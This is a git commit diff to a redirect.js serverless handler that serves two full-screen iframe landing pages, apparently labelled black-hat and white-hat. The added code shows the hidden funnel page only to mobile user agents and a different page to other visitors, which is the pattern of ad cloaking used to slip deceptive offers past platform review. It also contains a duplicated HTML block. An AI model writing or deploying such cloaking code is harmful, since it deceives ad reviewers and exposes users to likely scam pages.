30ba01250178c14f4ed42fe2a3e880919d4713b3
rmeeesumraza <github@snobay.com>
2025-01-15 17:39:32 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,14 +1,86 @@
-import {getLP} from "./config";
+import isRedirectEnabled from './config';
 
-export default async function handler(req, res) {
-    const userAgent = req.headers['user-agent'] || '';
+export default function handler(req, res) {
 
-    const lp = getLP(userAgent);
+    var bhLP = `
+    <html>
+        <body>
+            <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://jzudipwaq.myfunnelish.com/tt-shp-rw"></iframe>
+        </body>
+    </html>
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fullscreen iFrame</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden; /* Prevent scrolling */
+        }
+        iframe {
+            display: block;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://jzudipwaq.myfunnelish.com/tt-shp-rw"></iframe>
+</body>
+</html>
+    `;
 
+    var whLP = `
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fullscreen iFrame</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden; /* Prevent scrolling */
+        }
+        iframe {
+            display: block;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
+</body>
+</html>`;
+
+    if (!isRedirectEnabled) {
+        bhLP = whLP;
+    }
     // Get the User-Agent from the request headers
+    const userAgent = req.headers['user-agent'] || '';
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
-    res.writeHead(200, {'Content-Type': 'text/html'});
-    res.end(lp);
+    if (isMobileDevice) {
+      res.writeHead(200, { 'Content-Type': 'text/html' });
+      res.end(bhLP);
+    }
+    else { 
+      res.writeHead(200, { 'Content-Type': 'text/html' });
+      res.end(whLP);
+    }
 
     res.end();
-}
+  }
